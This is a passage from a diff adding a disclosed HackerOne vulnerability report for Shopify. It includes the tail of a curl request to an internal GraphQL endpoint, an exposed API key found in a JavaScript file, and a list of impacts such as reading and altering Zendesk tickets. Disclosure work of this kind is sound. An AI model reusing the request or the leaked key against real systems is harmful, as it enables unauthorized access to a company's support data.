}\\\\n\\&quot;,\\&quot;variables\\&quot;:{\\&quot;domain\\&quot;:\\&quot;ok.myshopify.com\\&quot;}}&#39; \\\n    $&#39;https://athena-flex-production.shopifycloud.com/graphql&#39;\n</code></pre>\n<p><strong>More information</strong></p>\n\n<p>There is also an API key that I found on the JS file. I think this might be the Zendesk api key but I am not yet sure: </p>\n<pre class=\"highlight plaintext\"><code>R = n.n(O)()({\n apiKey: &quot;5c0246635b3c77189888c0b10d3427ac&quot;,\n notifyReleaseStages: [&quot;production&quot;],\n releaseStage: &quot;production&quot; \n}),\n</code></pre>\n<h2 id=\"impact\">Impact</h2>\n\n<ol>\n<li>Get ticket description means dumping any detail you want. </li>\n<li>Creating zendesk ticket in behalf of other agents. </li>\n<li>Changing state of other tickets. </li>\n</ol>\n\n<p><strong>I will post list of all functions that is possible in this graphql.</strong></p>\n", 
+    "severity_rating": "critical", 
+    "team_private?": false, 
+    "team": {
+        "profile": {
+            "website": "https://www.shopify.com", 
+            "about": "Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between.", 
+            "twitter_handle": "", 
+            "name": "Shopify"
+        }, 
+        "handle": "shopify", 
+        "url": "https://hackerone.com/shopify", 
+        "state": "public_mode", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/001/382/1e9872bf9cfe04008c2673e07bfecaa83858cca1_small.jpg?1532728703", 
+            "medium": "https://profile-photos.hackerone-user-content.com/000/001/382/30421c25f4a7b03ec3250e36efb64f7291402806_medium.jpg?1532728703"
+        }, 
+        "awards_miles": false, 
+        "permissions": [], 
+        "id": 1382, 
+        "default_currency": "usd"
+    }, 
+    "is_published": false
+}
